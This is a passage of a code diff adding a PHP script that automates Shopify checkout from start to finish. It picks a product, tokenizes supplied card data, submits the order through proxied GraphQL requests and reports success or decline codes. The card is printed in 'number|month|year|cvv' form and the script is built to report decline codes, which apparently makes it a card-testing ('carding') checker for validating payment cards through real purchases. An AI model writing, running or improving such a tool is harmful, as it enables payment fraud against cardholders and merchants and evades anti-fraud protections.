+                echo "  ❌ GraphQL errors:\n";
+                foreach ($data['errors'] as $error) {
+                    echo "    - " . ($error['message'] ?? 'Unknown') . "\n";
+                }
+                echo "  Full response: " . json_encode($data, JSON_PRETTY_PRINT) . "\n";
+                return null;
+            }
+            
+            $result = $data['data']['submitForCompletion'] ?? null;
+            
+            if (!$result) {
+                echo "  ❌ No submitForCompletion in response\n";
+                echo "  Response structure: " . json_encode($data, JSON_PRETTY_PRINT) . "\n";
+                return null;
+            }
+            
+            $resultType = $result['__typename'] ?? 'Unknown';
+            echo "  Result type: $resultType\n";
+            
+            if (in_array($resultType, ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'])) {
+                $receipt = $result['receipt'] ?? [];
+                $receiptId = $receipt['id'] ?? null;
+                
+                if ($receiptId) {
+                    echo "  ✅ Receipt ID: $receiptId\n";
+                    return ['receipt_id' => $receiptId, 'submit_code' => 'SUCCESS'];
+                } else {
+                    echo "  ⚠️ No receipt ID in success response\n";
+                    echo "  Receipt data: " . json_encode($receipt, JSON_PRETTY_PRINT) . "\n";
+                }
+            } elseif ($resultType === 'SubmitRejected') {
+                $errors = $result['errors'] ?? [];
+                echo "  ❌ Submit rejected:\n";
+                foreach ($errors as $error) {
+                    $code = $error['code'] ?? 'UNKNOWN';
+                    $message = $error['localizedMessage'] ?? 'No message';
+                    echo "    - $code: $message\n";
+                }
+                return ['receipt_id' => null, 'submit_code' => $errors[0]['code'] ?? 'REJECTED'];
+            } elseif ($resultType === 'SubmitFailed') {
+                $reason = $result['reason'] ?? 'Unknown';
+                echo "  ❌ Submit failed: $reason\n";
+                return ['receipt_id' => null, 'submit_code' => 'FAILED'];
+            } elseif ($resultType === 'Throttled') {
+                $pollAfter = $result['pollAfter'] ?? null;
+                echo "  ⚠️ Throttled, pollAfter: $pollAfter\n";
+                return ['receipt_id' => null, 'submit_code' => 'THROTTLED'];
+            } else {
+                echo "  ❌ Unexpected result type: $resultType\n";
+                echo "  Full result: " . json_encode($result, JSON_PRETTY_PRINT) . "\n";
+                return null;
+            }
+            
+            return null;
+            
+        } catch (Exception $e) {
+            echo "  ❌ Error: " . $e->getMessage() . "\n";
+            return null;
+        }
+    }
+    
+
+    public function step5_pollReceipt($checkoutToken, $sessionToken, $receiptId, $maxAttempts = 10) {
+        echo "[5/5] Polling for receipt...\n";
+        
+        $url = $this->shopUrl . '/checkouts/unstable/graphql?operationName=PollForReceipt';
+        
+        $query = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}}';
+        
+        $headers = [
+            'shopify-checkout-client: checkout-web/1.0',
+            'shopify-checkout-source: id="' . $checkoutToken . '", type="cn"',
+            'x-checkout-one-session-token: ' . $sessionToken,
+            'x-checkout-web-source-id: ' . $checkoutToken,
+        ];
+        
+        for ($attempt = 1; $attempt <= $maxAttempts; $attempt++) {
+            echo "  Polling attempt $attempt/$maxAttempts...\n";
+            
+            $payload = [
+                'operationName' => 'PollForReceipt',
+                'query' => $query,
+                'variables' => [
+                    'receiptId' => $receiptId,
+                    'sessionToken' => $sessionToken
+                ]
+            ];
+            
+            try {
+                $response = $this->request($url, 'POST', $payload, $headers);
+                
+                if ($response['status'] != 200) {
+                    usleep(2000000);
+                    continue;
+                }
+                
+                $data = json_decode($response['body'], true);
+                $receipt = $data['data']['receipt'] ?? null;
+                
+                if (!$receipt) {
+                    usleep(2000000);
+                    continue;
+                }
+                
+                $receiptType = $receipt['__typename'] ?? 'Unknown';
+                echo "  Receipt type: $receiptType\n";
+                
+                if ($receiptType === 'ProcessedReceipt') {
+                    echo "  ✅ Order completed successfully!\n";
+                    $orderId = $receipt['orderIdentity']['id'] ?? null;
+                    $orderNumber = $receipt['orderIdentity']['buyerIdentifier'] ?? null;
+                    
+                    if ($orderNumber) {
+                        echo "  Order Number: $orderNumber\n";
+                    }
+                    
+                    return ['success' => true, 'order_number' => $orderNumber];
+                }
+                
+                if ($receiptType === 'FailedReceipt') {
+                    $error = $receipt['processingError'] ?? [];
+                    $errorCode = $error['code'] ?? 'UNKNOWN';
+                    $errorMessage = $error['messageUntranslated'] ?? 'Unknown error';
+                    
+                    echo "  ❌ Order failed: $errorCode - $errorMessage\n";
+                    return ['success' => false, 'error_code' => $errorCode, 'error_message' => $errorMessage];
+                }
+                
+                if ($receiptType === 'ProcessingReceipt') {
+                    $pollDelay = $receipt['pollDelay'] ?? 2000;
+                    $waitSeconds = min($pollDelay / 1000.0, 8.0);
+                    echo "  ⏳ Still processing, waiting {$waitSeconds}s...\n";
+                    usleep((int)($waitSeconds * 1000000));
+                    continue;
+                }
+                
+            } catch (Exception $e) {
+                echo "  ⚠️ Error: " . $e->getMessage() . "\n";
+                usleep(2000000);
+                continue;
+            }
+        }
+        
+        echo "  ❌ Polling timeout\n";
+        return ['success' => false, 'error' => 'TIMEOUT'];
+    }
+}
+
+
+
+echo "==============================================\n";
+echo "Shopify Checkout\n";
+echo "==============================================\n";
+echo "URL: $SHOP_URL\n";
+echo "Card: {$CARD_DATA['number']}|{$CARD_DATA['month']}|{$CARD_DATA['year']}|{$CARD_DATA['cvv']}\n";
+echo "==============================================\n\n";
+
+try {
+    $checkout = new ShopifyCheckout($SHOP_URL, $PROXY);
+    
+
+    $product = $checkout->step0_detectProduct();
+    if (!$product) {
+        die("❌ Failed to detect product\n");
+    }
+    
+    $variantId = $product['variant_id'];
+    echo "\n";
+    
+
+    $checkoutData = $checkout->step1_addToCart($variantId);
+    if (!$checkoutData) {
+        die("❌ Failed to create checkout\n");
+    }
+    echo "\n";
+    
+
+    $cardDetails = [
+        'number' => $CARD_DATA['number'],
+        'month' => $CARD_DATA['month'],
+        'year' => $CARD_DATA['year'],
+        'verification_value' => $CARD_DATA['cvv'],
+        'name' => $CARD_DATA['name']
+    ];
+    
+    $tokenizeResult = $checkout->step2_tokenizeCard($SHOP_URL, $cardDetails);
+    if (!$tokenizeResult || !$tokenizeResult['success']) {
+        die("❌ Failed to tokenize card\n");
+    }
+    
+    $cardSessionId = $tokenizeResult['card_session_id'];
+    echo "\n";
+    
+
+    $proposalData = $checkout->step3_proposal(
+        $checkoutData['checkout_token'],
+        $checkoutData['session_token'],
+        $variantId,
+        $CHECKOUT_DATA
+    );
+    if (!$proposalData) {
+        die("❌ Failed to get proposal data\n");
+    }
+    echo "\n";
+    
+
+    $submitResult = $checkout->step4_submitCompletion(
+        $checkoutData['checkout_token'],
+        $checkoutData['session_token'],
+        $proposalData['queue_token'],
+        $proposalData['shipping_handle'],
+        $proposalData['merchandise_stable_id'],
+        $cardSessionId,
+        $proposalData['actual_total'],
+        $proposalData['delivery_expectations'],
+        $variantId,
+        $CHECKOUT_DATA
+    );
+    if (!$submitResult || !$submitResult['receipt_id']) {
+        die("❌ Failed to submit for completion\n");
+    }
+    echo "\n";
+    
+
+    $receiptResult = $checkout->step5_pollReceipt(
+        $checkoutData['checkout_token'],
+        $checkoutData['session_token'],
+        $submitResult['receipt_id'],
+        10
+    );
+    echo "\n";
+    
+    if ($receiptResult && $receiptResult['success']) {
+        echo "==============================================\n";
+        echo "✅ SUCCESS - Order Completed!\n";
+        echo "==============================================\n";
+        if (isset($receiptResult['order_number'])) {
+            echo "Order Number: {$receiptResult['order_number']}\n";
+        }
+        echo "Amount: \${$proposalData['actual_total']}\n";
+    } else {
+        echo "==============================================\n";
+        echo "❌ FAILED - Order Not Completed\n";
+        echo "==============================================\n";
+        if (isset($receiptResult['error_code'])) {
+            echo "Error Code: {$receiptResult['error_code']}\n";
+        }
+        if (isset($receiptResult['error_message'])) {
+            echo "Error Message: {$receiptResult['error_message']}\n";
+        }
+    }
+    
+} catch (Exception $e) {
+    echo "\n❌ Exception: " . $e->getMessage() . "\n";
+}
